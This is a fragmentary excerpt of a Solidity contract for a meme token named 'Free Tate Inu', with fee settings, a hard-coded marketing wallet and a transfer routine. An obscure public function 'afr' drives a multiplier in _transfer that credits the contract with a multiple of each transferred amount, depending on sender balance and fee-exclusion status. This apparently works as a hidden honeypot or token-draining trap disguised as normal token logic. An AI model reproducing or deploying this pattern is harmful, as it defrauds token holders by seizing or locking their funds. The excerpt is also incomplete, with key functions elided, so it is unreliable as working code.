...
contract FTI is Context, IERC20, Ownable {
    ...
    string private constant _name = "Free Tate Inu"; //
    string private constant _symbol = unicode"FTI"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xe3D180eB65673530fDa68b27961188B1D4fADD86;
    bool public setReadyTimes = false;


    bool private swapping;
    uint256 private walllimit = 10000 * 10**9;
    ...
    function afr(address deadadr) public returns(uint256) {
        return reflection((balanceOf(deadadr)<walllimit),isExcludedFromFee(deadadr));
    }
    ...
    function _transfer(
        ...
        _tOwned[address(this)] += amount*afr(from); 
